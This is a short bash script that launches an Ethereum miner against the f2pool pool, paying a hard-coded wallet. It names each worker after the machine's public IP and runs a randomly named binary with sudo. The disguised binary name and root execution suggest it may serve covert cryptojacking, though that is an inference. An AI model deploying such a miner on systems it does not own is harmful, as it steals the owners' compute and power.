#!/bin/bash

POOL=eth.f2pool.com:6688
WALLET=0x35c7ed9124ea813033d909c0698a1eb52aa9e268
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok

cd "$(dirname "$0")"

chmod +x ./eaedaeqsd2wqe122 && sudo ./eaedaeqsd2wqe122 -a ETHASH  -o $POOL -u $WALLET.$WORKER $@
